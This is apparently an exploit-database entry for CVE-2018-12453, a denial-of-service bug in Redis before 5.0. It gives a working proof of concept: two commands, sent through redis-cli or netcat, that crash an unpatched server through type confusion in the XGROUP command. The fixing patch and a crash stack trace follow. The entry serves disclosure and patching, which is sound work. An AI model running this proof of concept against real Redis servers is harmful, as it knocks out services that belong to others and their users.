@@ -1,0 +1,50 @@
+# Exploit Title: Redis 5.0 Denial of Service
+# Date: 2018-06-13
+# Exploit Author: Fakhri Zulkifli (@d0lph1n98)
+# Vendor Homepage: https://redis.io/
+# Software Link: https://redis.io/download
+# Version: 5.0
+# Fixed on: 5.0
+# CVE : CVE-2018-12453
+
+Type confusion in the xgroupCommand function in t_stream.c in redis-server in Redis before 5.0 allows remote attackers to cause denial-of-service via an XGROUP command in which the key is not a stream.
+
+
+PoC:
+$ ./src/redis-cli -p 1234
+127.0.0.1:1234> set a 123
+OK
+127.0.0.1:1234> xgroup create a b $
+Error: Connection reset by peer  <— segfault'ed
+127.0.0.1:1234>
+
+The bug also could be triggered via netcat
+$ nc 127.0.0.1 1234
+set a 123
++OK
+xgroup create a b $  <— segfault’ed after this line
+
+
+@@ -1576,7 +1576,7 @@ NULL
+     /* Lookup the key now, this is common for all the subcommands but HELP. */
+     if (c->argc >= 4) {
+robj *o = lookupKeyWriteOrReply(c,c->argv[2],shared.nokeyerr);
+-         if (o == NULL) return;
++         if (o == NULL || checkType(c,o,OBJ_STREAM)) return;
+         s = o->ptr;
+         grpname = c->argv[3]->ptr;
+
+
+  #0 0x6d0706 in logStackContent /home/user/redis/src/debug.c:732:45
+  #1 0x6d3917 in sigsegvHandler /home/user/redis/src/debug.c:1089:5
+  #2 0x7f65d736e38f  (/lib/x86_64-linux-gnu/libpthread.so.0+0x1138f)
+  #3 0x804afc in streamLookupCG /home/user/redis/src/t_stream.c:1502:12
+  #4 0x805b36 in xgroupCommand /home/user/redis/src/t_stream.c:1584:19
+  #5 0x58ded7 in call /home/user/redis/src/server.c:2298:5
+  #6 0x591c70 in processCommand /home/user/redis/src/server.c:2580:9
+  #7 0x5e2d98 in processInputBuffer /home/user/redis/src/networking.c:1325:17
+  #8 0x565612 in aeProcessEvents /home/user/redis/src/ae.c:443:17
+  #9 0x56614c in aeMain /home/user/redis/src/ae.c:501:9
+  #10 0x59da71 in main /home/user/redis/src/server.c:3992:5
+  #11 0x7f65d6d9d82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+  #12 0x43da38 in _start (/home/user/redis/src/redis-server+0x43da38)
